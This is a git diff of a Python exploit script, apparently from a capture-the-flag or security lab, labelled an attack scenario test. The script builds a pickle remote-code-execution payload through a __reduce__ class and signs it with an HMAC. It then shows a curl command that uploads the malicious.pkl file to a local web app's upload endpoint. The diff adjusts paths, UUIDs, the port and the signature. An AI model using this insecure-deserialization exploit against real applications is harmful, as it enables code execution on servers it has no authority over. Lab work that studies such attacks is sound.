@@ -1,10 +1,9 @@
-# attack scenario (test)
+# Attack scenario (test)
 # this is the script file which the attacker uses in his local PC
 import pickle, os, hashlib, hmac
 
-# print(os.path.abspath("app/uploads"))
-UPLOAD_DIR = '/app/uploads'
-uuid = "d7fead3b-245b-4be8-8164-4323fe23830d"
+UPLOAD_DIR = "/app/app/uploads"
+uuid = "ab8ba41e-53a8-4b35-8e0b-fbfd4cbafaf8"
 
 class RCE:
     def __reduce__(self):
@@ -21,12 +20,7 @@ print(f"HMAC signature: {sig}")
 
 # hacker then uploads the malicious.pkl file on the website
 '''
-curl -X POST http://127.0.0.1:5000/upload \
+curl -X POST http://localhost:916/upload \
   -F "file=@malicious.pkl" \
-  -F "sig=90c67aeb218e5272a9510e48ab54d6e14e1fec35db2e5a31bb9c9ac9d0809ed0" \
-  -F "uuid=d7fead3b-245b-4be8-8164-4323fe23830d"
-  
-  '''
-
-# 1. generate hacked.txt below app/uploads/{your_uuid}
-# 2. check the flag by $ curl http://localhost:916/uploads/{your_uuid}/hacked.txt
+  -F "sig=7547b3173b1ce073d4a99658ea4cf95ad053f7180176cf84d8f2254be41d5430"  # requires correct sig here
+'''
